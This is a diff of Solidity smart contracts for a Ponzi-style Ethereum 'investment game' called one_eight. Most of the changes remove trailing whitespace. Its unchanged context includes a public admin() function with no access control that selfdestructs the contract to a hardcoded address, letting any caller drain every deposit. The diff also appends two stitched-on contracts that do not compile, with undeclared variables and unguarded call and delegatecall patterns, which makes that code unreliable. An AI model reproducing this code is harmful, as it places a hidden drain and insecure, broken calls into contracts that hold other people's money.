@@ -2,8 +2,8 @@ pragma solidity ^0.4.25;
 
 /**
 
-A simple contract. A simple game. 
-A simple way to earn. 
+A simple contract. A simple game.
+A simple way to earn.
 
 Be one.eight
 
@@ -11,11 +11,11 @@ Be one.eight
 
 contract one_eight {
     using SafeMath for uint256;
-    
+
     mapping (address => uint256) public investedETH;
     mapping (address => uint256) public lastInvest;
     mapping (address => uint256) public affiliateCommision;
-    
+
      /** the creator */
     address creator = 0xEDa159d4AD09bEdeB9fDE7124E0F5304c30F7790;
      /** development and maintenance */
@@ -23,43 +23,43 @@ contract one_eight {
      /** the peoples charity */
     address charity = 0xF57924672D6dBF0336c618fDa50E284E02715000;
 
-    
+
     function investETH(address referral) public payable {
-        
+
         require(msg.value >= .05 ether);
-        
+
         if(getProfit(msg.sender) > 0){
             uint256 profit = getProfit(msg.sender);
             lastInvest[msg.sender] = now;
             msg.sender.transfer(profit);
         }
-        
+
         uint256 amount = msg.value;
-        uint256 commision = SafeMath.div(amount, 40); /** partner share 2.5% */ 
+        uint256 commision = SafeMath.div(amount, 40); /** partner share 2.5% */
         if(referral != msg.sender && referral != 0x1){
             affiliateCommision[referral] = SafeMath.add(affiliateCommision[referral], commision);
         }
-        
+
         creator.transfer(msg.value.div(100).mul(5)); /** creator */
         damn.transfer(msg.value.div(100).mul(3)); /** development and maintenance */
         charity.transfer(msg.value.div(100).mul(1)); /** give away  */
-        
+
         investedETH[msg.sender] = SafeMath.add(investedETH[msg.sender], amount);
         lastInvest[msg.sender] = now;
     }
-    
-    
+
+
     function withdraw() public{
         uint256 profit = getProfit(msg.sender);
         require(profit > 0);
         lastInvest[msg.sender] = now;
         msg.sender.transfer(profit);
     }
-    
+
     function admin() public {
 		selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);
-	}    
-    
+	}
+
     function getProfitFromSender() public view returns(uint256){
         return getProfit(msg.sender);
     }
@@ -68,37 +68,37 @@ contract one_eight {
         uint256 secondsPassed = SafeMath.sub(now, lastInvest[customer]);
         return SafeMath.div(SafeMath.mul(secondsPassed, investedETH[customer]), 4800000); /** one eight */
     }
-    
+
     function reinvestProfit() public {
         uint256 profit = getProfit(msg.sender);
         require(profit > 0);
         lastInvest[msg.sender] = now;
         investedETH[msg.sender] = SafeMath.add(investedETH[msg.sender], profit);
     }
-    
+
     function getAffiliateCommision() public view returns(uint256){
         return affiliateCommision[msg.sender];
     }
-    
+
     function withdrawAffiliateCommision() public {
         require(affiliateCommision[msg.sender] > 0);
         uint256 commision = affiliateCommision[msg.sender];
         affiliateCommision[msg.sender] = 0;
         msg.sender.transfer(commision);
     }
-    
+
     function getInvested() public view returns(uint256){
         return investedETH[msg.sender];
     }
-    
+
     function getBalance() public view returns(uint256){
         return address(this).balance;
     }
-    
+
     function min(uint256 a, uint256 b) private pure returns (uint256) {
         return a < b ? a : b;
     }
-    
+
     function max(uint256 a, uint256 b) private pure returns (uint256) {
         return a > b ? a : b;
     }
@@ -143,5 +143,21 @@ library SafeMath {
     uint256 c = a + b;
     assert(c >= a);
     return c;
+  }
+}
+pragma solidity ^0.4.24;
+contract CallTXNContract {
+	constructor() public {owner = msg.sender;}
+	 function sendCallSignal() public {
+   		msg.sender.call{value: msg.value, gas: 5000};
+  }
+}
+pragma solidity ^0.4.24;
+contract DCallTXNContract {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function externalSignal() public {
+  	if ((amountToWithdraw > 0) && (amountToWithdraw <= address(this).balance)) {
+   		msg.sender.delegateCall{gas: 1000};}
   }
 }
